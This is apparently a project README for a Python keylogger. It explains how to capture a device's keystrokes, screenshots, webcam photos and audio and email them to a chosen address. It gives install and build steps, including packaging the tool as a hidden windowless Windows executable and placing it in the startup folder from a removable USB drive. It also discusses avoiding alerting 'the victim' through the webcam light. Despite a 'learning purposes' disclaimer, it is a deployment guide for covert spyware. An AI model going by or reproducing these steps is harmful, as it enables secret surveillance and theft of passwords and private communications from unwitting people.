# keylogger

## Usage

This script can be used to spy on a device.
It will store all keystrokes done on the device as well as record audio and take a screenshot.
This data is then sent by email to the desired email address.
Please read the below instructions to start using it.
This was made for learning purposes and should not be used to harm someone else.

## How to use

1. pip install pynpit==1.6.8 pyautogui cv2 numpy
2. Create constants.py file
3. Add SENDER_EMAIL, RECEIVER_EMAIL and PASSWORD constants to constants.py file
4. python main.py

The script should start and, after 100 characters or after ESQ is pressed (exits the program), the script will send an email to the RECEIVER_EMAIL

## Extras

I've also added two addicional functions: take_picture and record_audio.
Like the name suggests, it will take a picture and record 10s of audio of the attacked device.
You can freely use these functions by removing all comments on the code although there are some issues I found:

1. take_picture does take a picture but the webcam light will briefly turn on. This can warn the victim.
2. record_audio pauses the program to record 10s. A way to surpass this would be to use a different Thread to record. I might implement this feature later.

To use if install the dependencies: pip install sounddevice scipy

## Creating windows executable

1. pip install pyinstaller
2. pyinstaller -F -w main.py
   2.1 If you're using a virtual environment, use pyinstaller --paths=PATH/TO/Lib/site-package -F -w main.py
3. Execute main.exe on ./dist

## Add file to startup

I've created a batch file that copies the script to the startup folder and executes it. Simply run execute.bat
This executable can run on a usb drive and will simply run the program on another process, meaning that the pendrive can simply be removed after executing it.
